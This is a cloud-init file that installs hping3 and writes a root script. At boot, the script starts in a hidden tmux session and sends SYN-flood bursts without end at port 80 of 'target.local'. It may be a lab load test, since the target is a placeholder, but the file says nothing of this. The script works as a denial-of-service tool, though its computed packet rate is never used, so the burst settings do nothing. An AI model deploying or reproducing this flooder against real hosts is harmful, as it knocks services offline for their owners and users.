#cloud-config
package_update: true
packages:
  - hping3
  - tmux

write_files:
  - path: /root/IKW1a-p2.sh
    permissions: '0755'
    owner: root:root
    content: |
      #!/bin/bash
      set -euo pipefail

      TARGET="target.local"
      TARGET_PORT=80
      BASE_PPS=300000

      # Cycle config
      BURST1_PCT=100
      BURST1_DUR=45
      BURST2_PCT=60
      BURST2_DUR=10
      COOLDOWN1=5
      COOLDOWN2=15

      run_burst() {
        local pct=$1
        local dur=$2
        local pps=$(( BASE_PPS * pct / 100 ))

        hping3 -S -p "$TARGET_PORT" --flood "$TARGET" > /dev/null 2>&1 &
        local pid=$!
        sleep "$dur"
        kill -9 "$pid" 2>/dev/null || true
      }

      while true; do
        run_burst "$BURST1_PCT" "$BURST1_DUR"
        sleep "$COOLDOWN1"
        run_burst "$BURST2_PCT" "$BURST2_DUR"
        sleep "$COOLDOWN2"
      done

runcmd:
  - tmux new-session -d -s h3woodpecker '/bin/bash /root/IKW1a-p2.sh'
